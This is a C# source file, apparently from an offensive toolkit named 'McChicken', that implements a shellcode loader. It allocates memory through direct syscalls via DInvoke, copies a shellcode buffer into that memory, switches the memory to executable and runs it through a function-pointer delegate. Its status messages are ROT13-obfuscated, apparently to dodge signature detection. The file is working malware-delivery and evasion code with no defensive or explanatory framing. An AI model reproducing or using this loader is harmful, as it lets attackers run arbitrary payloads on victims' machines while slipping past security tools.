//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class FunctionPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode, bool debug = false)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ShapgvbaCbvagre) [+] AgNyybpngrIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr protectAddress = baseAddress;
            regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ShapgvbaCbvagre) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
            f();

            #region CleanUp: NtFreeVirtualMemory (shellcode)

            regionSize = (IntPtr)shellcode.Length;

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ShapgvbaCbvagre.PyrnaHc) [+] AgSerrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(FunctionPointer.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");

            #endregion
        }
    }
}
